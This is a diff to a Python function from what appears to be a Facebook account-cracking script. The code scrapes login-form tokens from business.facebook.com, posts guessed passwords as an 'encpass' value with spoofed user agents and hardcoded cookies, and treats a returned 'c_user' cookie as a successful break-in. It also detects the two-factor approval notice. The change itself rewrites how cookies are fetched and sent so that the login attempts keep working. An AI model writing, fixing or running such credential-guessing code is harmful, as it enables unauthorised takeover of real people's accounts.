@@ -1758,7 +1758,8 @@ def mbasic(uid,pwx,tl):
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             Session = requests.Session()
-            cookie_values = {name: (lambda r: r.cookies.get(name))(requests.get('https://touch.facebook.com')) for name in ['fr', 'sb', 'datr', 'ps_n', 'ps_l', 'wd',]}
+            fr_cookie_value = requests.get('https://touch.facebook.com').cookies.get('fr')
+            datr_cookie_value = requests.get('https://touch.facebook.com').cookies.get('datr')
             free_fb = Session.get('https://business.facebook.com/').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1783,6 +1784,14 @@ def mbasic(uid,pwx,tl):
             'had_password_prefilled': 'false',
             'ab_test_data': re.search('name="ab_test_data" value="(.*?)"', str(free_fb)).group(1),
             'encpass':  "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            cookies ={
+            'fr': fr_cookie_value,
+            'sb': 'galBZijJE3gDNJ8fh_fhANhG',
+            'datr': datr_cookie_value,
+            'ps_n': '1',
+            'ps_l': '1',
+            'wd': '1440x402',
+            'usida': 'eyJ2ZXIiOjEsImlkIjoiQXNrdnhrdTFndmgxMGwiLCJ0aW1lIjoxNzI4MTM1MTAyfQ^%^3D^%^3D',}
             headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
@@ -1803,7 +1812,7 @@ def mbasic(uid,pwx,tl):
             'Cache-Control': 'no-cache',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https^%^3A^%^2F^%^2Fbusiness.facebook.com^%^2F^%^3Fnav_ref^%^3Dbiz_unified_f3_login_page_to_mbs^%^26biz_login_source^%^3Dbiz_unified_f3_fb_login_button^%^26join_id^%^3Dcff0905e-97a8-47c3-8847-ebabae1d9e27^%^26request_id^%^3D25f04381-053c-4af1-8492-a5d4f239c1b0&lwv=100"
-            po = Session.post(url, cookies=cookie_values, headers=headers, data=data).text
+            po = Session.post(url, cookies=cookies, headers=headers, data=data).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
